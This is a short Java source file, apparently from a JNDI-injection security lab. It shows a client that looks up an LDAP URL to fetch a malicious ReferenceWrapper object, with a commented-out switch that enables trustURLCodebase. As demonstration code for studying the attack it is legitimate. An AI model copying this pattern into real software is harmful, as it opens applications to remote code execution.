package com.anbai.sec.jndi.injection;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

import static com.anbai.sec.jndi.injection.LDAPReferenceServerTest.LDAP_URL;

/**
 * Creator: yz
 * Date: 2019/12/27
 */
public class LDAPReferenceClientTest {

	public static void main(String[] args) {
		try {
//			// 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//			System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

			Context ctx = new InitialContext();

			// 获取RMI绑定的恶意ReferenceWrapper对象
			Object obj = ctx.lookup(LDAP_URL);

			System.out.println(obj);
		} catch (NamingException e) {
			e.printStackTrace();
		}
	}

}
